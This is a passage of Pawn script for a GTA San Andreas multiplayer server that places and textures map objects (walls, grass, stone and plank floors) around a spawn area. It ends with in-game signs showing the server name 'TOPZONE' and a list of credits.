	SetDynamicObjectMaterial(UGSIGNVWOGRADA[4],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[5],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[5],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[6],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[6],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[7],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[7],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[8],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[8],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[9],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[9],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[10],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[10],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[11],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[11],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[12],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[12],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[13],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[13],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[14],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[14],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[15],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[15],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[16],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[16],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[17],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[17],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[18],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[18],1, 16150, "ufo_bar", "sa_wood08_128");

	SetDynamicObjectMaterial(UGSIGNVWOGRADA[19],0, 19325, "lsmall_shops", "lsmall_window01");
	SetDynamicObjectMaterial(UGSIGNVWOGRADA[19],1, 16150, "ufo_bar", "sa_wood08_128");
	//=================================  SPAWN ===================================================//
	new spawnzgrada = CreateObject(4028, 385.16769, -2089.52490, 20.32530,   0.00000, 0.00000, 0.00000,2000.00);
	SetObjectMaterial(spawnzgrada, 1, 5134, "wasteland_las2", "ws_sandstone2");
	SetObjectMaterial(spawnzgrada,2, 10052, "lomall", "sf_window_mod1");
	//SetObjectMaterial(spawnzgrada,3, 10052, "lomall", "sf_window_mod1");//vrata dole

	new BGSPAWNOKOLO[52];
	BGSPAWNOKOLO[0] = CreateDynamicObject(18980,387.7291000,-2064.2622100,7.2073000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[1] = CreateDynamicObject(18980,411.4191000,-2047.4792500,7.2033000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[2] = CreateDynamicObject(18980,423.4201000,-2060.5253900,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[3] = CreateDynamicObject(18980,423.4180900,-2084.4902300,7.2053000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[4] = CreateDynamicObject(18980,349.5900900,-2059.5024400,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[5] = CreateDynamicObject(18980,403.9371000,-2047.4772900,7.2053000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[6] = CreateDynamicObject(18980,398.9910900,-2034.4812000,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[7] = CreateDynamicObject(18980,398.9931000,-2024.4991500,7.2053000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[8] = CreateDynamicObject(18980,386.9950900,-2012.5011000,7.2033000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[9] = CreateDynamicObject(18980,349.5921000,-2084.4314000,7.2053000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[10] = CreateDynamicObject(18980,381.4971000,-2064.2602500,7.2053000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[11] = CreateDynamicObject(18762,368.5021100,-2062.2614700,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[12] = CreateDynamicObject(18762,400.7261000,-2062.2614700,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[13] = CreateDynamicObject(18762,368.5021100,-2057.2575700,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[14] = CreateDynamicObject(18762,400.7261000,-2057.2575700,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[15] = CreateDynamicObject(18762,352.5979000,-2047.5013400,7.2073000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[16] = CreateDynamicObject(18762,357.5949100,-2047.4772900,7.2073000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[17] = CreateDynamicObject(18762,362.5909100,-2047.4753400,7.2073000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[18] = CreateDynamicObject(18762,364.7225000,-2047.4772900,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[19] = CreateDynamicObject(18762,374.9509000,-2047.4772900,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[20] = CreateDynamicObject(18762,377.9789100,-2047.4792500,7.2053000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[21] = CreateDynamicObject(18762,382.0069000,-2047.4772900,7.2073000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[22] = CreateDynamicObject(18762,385.0029000,-2047.4772900,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[23] = CreateDynamicObject(18762,390.9379000,-2047.4772900,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[24] = CreateDynamicObject(18762,374.9645100,-2044.4847400,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[25] = CreateDynamicObject(18762,374.9645100,-2039.4868200,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[26] = CreateDynamicObject(18762,374.9809000,-2012.4932900,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[27] = CreateDynamicObject(18762,374.9779100,-2036.7683100,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[28] = CreateDynamicObject(18762,374.9645100,-2015.4969500,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[29] = CreateDynamicObject(18762,374.9645100,-2020.4969500,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[30] = CreateDynamicObject(18762,374.9798900,-2023.4963400,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[31] = CreateDynamicObject(18762,364.7225000,-2015.4628900,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[32] = CreateDynamicObject(18762,364.7225000,-2012.4672900,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[33] = CreateDynamicObject(18762,364.7225000,-2020.4628900,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[34] = CreateDynamicObject(18762,364.7244900,-2023.2463400,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[35] = CreateDynamicObject(18762,364.7265000,-2036.7812500,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[36] = CreateDynamicObject(18762,364.7225000,-2039.4868200,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[37] = CreateDynamicObject(18762,364.7225000,-2044.4847400,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[38] = CreateDynamicObject(18762,355.2175000,-2044.4847400,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[39] = CreateDynamicObject(18762,355.2155200,-2040.9416500,7.2093000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[40] = CreateDynamicObject(18762,352.2175000,-2037.9397000,7.2093000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[41] = CreateDynamicObject(18762,355.2164900,-2037.9462900,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[42] = CreateDynamicObject(18762,355.2155200,-2021.8498500,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[43] = CreateDynamicObject(18762,355.2155200,-2016.8479000,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[44] = CreateDynamicObject(18762,355.2155200,-2024.8492400,7.2073000,0.0000000,0.0000000,0.0000000); //
	BGSPAWNOKOLO[45] = CreateDynamicObject(18762,355.2155200,-2014.4648400,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[46] = CreateDynamicObject(18762,350.2195100,-2035.0377200,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[47] = CreateDynamicObject(18762,350.2195100,-2030.0406500,7.2053000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[48] = CreateDynamicObject(18762,350.2155200,-2026.9805900,7.2073000,0.0000000,90.0000000,90.0000000); //
	BGSPAWNOKOLO[49] = CreateDynamicObject(18762,352.2175000,-2024.8476600,7.2093000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[50] = CreateDynamicObject(18762,358.2114900,-2012.4697300,7.2093000,0.0000000,90.0000000,0.0000000); //
	BGSPAWNOKOLO[51] = CreateDynamicObject(18762,361.7995000,-2012.4676500,7.2073000,0.0000000,90.0000000,0.0000000); //

	SetDynamicObjectMaterial(BGSPAWNOKOLO[0], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[1], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[2], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[3], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[4], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[5], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[6], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[7], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[8], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[9], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[10], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[11], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[12], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[13], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[14], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[15], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[16], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[17], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[18], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[19], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[20], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[21], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[22], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[23], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[24], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[25], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[26], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[27], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[28], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[29], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[30], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[31], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[32], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[33], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[34], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[35], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[36], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[37], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[38], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[39], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[40], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[41], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[42], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[43], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[44], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[45], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[46], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[47], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[48], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[49], 0, 17298, "weefarmcuntw", "sjmbigold1");
	SetDynamicObjectMaterial(BGSPAWNOKOLO[50], 0, 17298, "weefarmcuntw", "sjmbigold1");
    SetDynamicObjectMaterial(BGSPAWNOKOLO[51], 0, 17298, "weefarmcuntw", "sjmbigold1");

	new BGSPAWNKAMEN[3];
	BGSPAWNKAMEN[0] = CreateDynamicObject(19378, 374.25711, -2059.60181, 6.78250,   0.00000, 90.00000, 0.00000);
	BGSPAWNKAMEN[1] = CreateDynamicObject(19378, 384.75610, -2059.60181, 6.78250,   0.00000, 90.00000, 0.00000);
	BGSPAWNKAMEN[2] = CreateDynamicObject(19378, 395.09610, -2059.60181, 6.78050,   0.00000, 90.00000, 0.00000);
	SetDynamicObjectMaterial(BGSPAWNKAMEN[0] , 0, 8565, "vgsebuild01", "ws_stonewall");
	SetDynamicObjectMaterial(BGSPAWNKAMEN[1] , 0, 8565, "vgsebuild01", "ws_stonewall");
	SetDynamicObjectMaterial(BGSPAWNKAMEN[2] , 0, 8565, "vgsebuild01", "ws_stonewall");

	new BGSPAWNTRAVA[27];
	BGSPAWNTRAVA[0] = CreateDynamicObject(19462, 350.84460, -2052.79907, 6.81160,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[1] = CreateDynamicObject(19462, 350.84460, -2062.44507, 6.81160,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[2] = CreateDynamicObject(19462, 350.84460, -2072.09106, 6.81160,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[3] = CreateDynamicObject(19462, 350.84460, -2078.39819, 6.80960,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[4] = CreateDynamicObject(19462, 357.37860, -2048.77319, 6.81160,   0.00000, 90.00000, 90.00000);
	BGSPAWNTRAVA[5] = CreateDynamicObject(19462, 359.29260, -2048.77319, 6.80960,   0.00000, 90.00000, 90.00000);
	BGSPAWNTRAVA[6] = CreateDynamicObject(19462, 396.20660, -2048.77319, 6.81160,   0.00000, 90.00000, 90.00000);
	BGSPAWNTRAVA[7] = CreateDynamicObject(19462, 405.79959, -2048.77319, 6.81160,   0.00000, 90.00000, 90.00000);
	BGSPAWNTRAVA[8] = CreateDynamicObject(19462, 415.39261, -2048.77319, 6.81160,   0.00000, 90.00000, 90.00000);
	BGSPAWNTRAVA[9] = CreateDynamicObject(19462, 418.46960, -2048.77319, 6.80960,   0.00000, 90.00000, 90.00000);
	BGSPAWNTRAVA[10] = CreateDynamicObject(19462, 422.16061, -2055.35327, 6.81160,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[11] = CreateDynamicObject(19462, 422.16061, -2064.92920, 6.81160,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[12] = CreateDynamicObject(19462, 422.16061, -2074.57715, 6.81160,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[13] = CreateDynamicObject(19462, 422.16061, -2084.22510, 6.81160,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[14] = CreateDynamicObject(19462, 357.39359, -2081.95020, 6.80960,   0.00000, 90.00000, 90.00000);
	BGSPAWNTRAVA[15] = CreateDynamicObject(19433, 375.77899, -2060.18066, 6.78860,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[16] = CreateDynamicObject(19433, 379.28299, -2060.18066, 6.78860,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[17] = CreateDynamicObject(19433, 382.79199, -2060.18066, 6.78860,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[18] = CreateDynamicObject(19433, 386.28400, -2060.18066, 6.78860,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[19] = CreateDynamicObject(19433, 389.79099, -2060.18066, 6.79260,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[20] = CreateDynamicObject(19433, 375.77899, -2058.59668, 6.78860,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[21] = CreateDynamicObject(19433, 379.28299, -2058.59668, 6.78860,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[22] = CreateDynamicObject(19433, 382.79199, -2058.59668, 6.78860,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[23] = CreateDynamicObject(19433, 386.28400, -2058.59668, 6.78860,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[24] = CreateDynamicObject(19433, 389.79099, -2058.59668, 6.79260,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[25] = CreateDynamicObject(19433, 393.06900, -2058.59668, 6.79060,   0.00000, 90.00000, 0.00000);
	BGSPAWNTRAVA[26] = CreateDynamicObject(19433, 393.06900, -2060.18066, 6.79060,   0.00000, 90.00000, 0.00000);

	SetDynamicObjectMaterial(BGSPAWNTRAVA[0] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[1] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[2] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[3] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[4] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[5] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[6] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[7] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[8] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[9] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[10] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[11] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[12] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[13] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[14] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[15] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[16] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[17] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[18] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[19] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[20] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[21] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[22] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[23] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[24] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[25] , 0, 5408, "tempstuff_lae", "Grass_128HV");
	SetDynamicObjectMaterial(BGSPAWNTRAVA[26] , 0, 5408, "tempstuff_lae", "Grass_128HV");

	new BGSPAWNPOD[14];
	BGSPAWNPOD[0] = CreateDynamicObject(18981, 361.52121, -2059.47241, 6.36610,   0.00000, 90.00000, 90.00000);
	BGSPAWNPOD[1] = CreateDynamicObject(18981, 361.52121, -2084.45947, 6.36610,   0.00000, 90.00000, 90.00000);
	BGSPAWNPOD[2] = CreateDynamicObject(18981, 386.48721, -2059.47241, 6.36610,   0.00000, 90.00000, 90.00000);
	BGSPAWNPOD[3] = CreateDynamicObject(18981, 411.45319, -2059.46948, 6.36610,   0.00000, 90.00000, 90.00000);
	BGSPAWNPOD[4] = CreateDynamicObject(18981, 386.48721, -2084.45947, 6.36610,   0.00000, 90.00000, 90.00000);
	BGSPAWNPOD[5] = CreateDynamicObject(18981, 411.45319, -2084.43359, 6.36610,   0.00000, 90.00000, 90.00000);
	BGSPAWNPOD[6] = CreateObject(18981, 386.99121, -2034.56738, 6.3641,   0.00000, 90.00000, 0.00000,2000.00);
	BGSPAWNPOD[7] = CreateObject(18981, 386.99121, -2024.49341, 6.3661,   0.00000, 90.00000, 0.00000,2000.00);
	//
	BGSPAWNPOD[8] = CreateObject(19377, 359.96860, -2043.02161, 6.82190,   0.00000, 90.00000, 0.00000,2000.00);
	BGSPAWNPOD[9] = CreateObject(19377, 359.96860, -2033.40454, 6.82390,   0.00000, 90.00000, 0.00000,2000.00);
	BGSPAWNPOD[10] = CreateObject(19377, 359.96860, -2023.78760, 6.82390,   0.00000, 90.00000, 0.00000,2000.00);
	BGSPAWNPOD[11] = CreateObject(19377, 359.96860, -2016.82556, 6.82190,   0.00000, 90.00000, 0.00000,2000.00);
	BGSPAWNPOD[12] = CreateObject(19377, 355.42560, -2033.40454, 6.82190,   0.00000, 90.00000, 0.00000,2000.00);
	BGSPAWNPOD[13] = CreateObject(19377, 355.42560, -2029.29956, 6.81990,   0.00000, 90.00000, 0.00000,2000.00);
	SetDynamicObjectMaterial(BGSPAWNPOD[0],  0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);
	SetDynamicObjectMaterial(BGSPAWNPOD[1],  0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);
	SetDynamicObjectMaterial(BGSPAWNPOD[2],  0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);
	SetDynamicObjectMaterial(BGSPAWNPOD[3],  0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);
	SetDynamicObjectMaterial(BGSPAWNPOD[4],  0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);
	SetDynamicObjectMaterial(BGSPAWNPOD[5],  0, 6300, "pierb_law2", "pierplanks_128",0xFF663300);
	SetObjectMaterial(BGSPAWNPOD[6], 0, 3975, "lanbloke", "p_floor3");
	SetObjectMaterial(BGSPAWNPOD[7], 0, 3975, "lanbloke", "p_floor3");
	SetObjectMaterial(BGSPAWNPOD[8], 0, 3975, "lanbloke", "p_floor3");
	SetObjectMaterial(BGSPAWNPOD[9], 0, 3975, "lanbloke", "p_floor3");
	SetObjectMaterial(BGSPAWNPOD[10], 0, 3975, "lanbloke", "p_floor3");
	SetObjectMaterial(BGSPAWNPOD[11], 0, 3975, "lanbloke", "p_floor3");
	SetObjectMaterial(BGSPAWNPOD[12], 0, 3975, "lanbloke", "p_floor3");
	SetObjectMaterial(BGSPAWNPOD[13], 0, 3975, "lanbloke", "p_floor3");
	
	new UGWLC1 = CreateDynamicObject(19353, 383.6432, -2059.5447, 9.2281, 0.0000, 0.0000, 90.3016);
	SetDynamicObjectMaterialText(UGWLC1,  0,"{0066FF}TOP{FFFFFF}ZONE", 140, "Arial", 80, 1, -16777216, 0, 1);
	new UGWLC2 = CreateDynamicObject(19353, 383.6432, -2059.5447, 8.5561, 0.0000, 0.0000, 90.3016);
	SetDynamicObjectMaterialText(UGWLC2,  0,"{0066FF}RPG.T-ZONE.IR",  140, "Arial", 80, 1, -16777216, 0, 1);
	new UGWLC3 = CreateDynamicObject(19353,383.6432, -2059.5447, 7.9541, 0.0000, 0.0000, 90.3016);
	SetDynamicObjectMaterialText(UGWLC3,  0,"{0066FF}",  140, "Arial", 80, 1, -16777216, 0, 1);
	new CREDAWLC = CreateDynamicObject(19353, 355.1851, -2065.9533, 9.4261, 0.0000, 0.0000, 1.3075);
	SetDynamicObjectMaterialText(CREDAWLC,  0,"- CREDITS -",  140, "Arial", 50, 1, -16777216, 0, 1);
	new DEVELOPTEXT = CreateDynamicObject(19353, 355.1955, -2065.9482, 8.8661, 0.0000, 0.0000, 1.4141);
	SetDynamicObjectMaterialText(DEVELOPTEXT,  0,"Founder - Morteza.",  140, "Arial", 40, 1, -16777216, 0, 1);
	new DEVELOPTEXT2 = CreateDynamicObject(19353, 355.1955, -2065.9202, 8.5021, 0.0000, 0.0000, 1.4141);
	SetDynamicObjectMaterialText(DEVELOPTEXT2,  0,"Scripters - rOnan,BlackHat.",  140, "Arial", 40, 1, -16777216, 0, 1);
	new DEVELOPTEXT3 = CreateDynamicObject(19353, 355.1955, -2065.9202, 8.1101, 0.0000, 0.0000, 1.4141);
	SetDynamicObjectMaterialText(DEVELOPTEXT3,  0,"AmirH",  140, "Arial", 40, 1, -16777216, 0, 1);
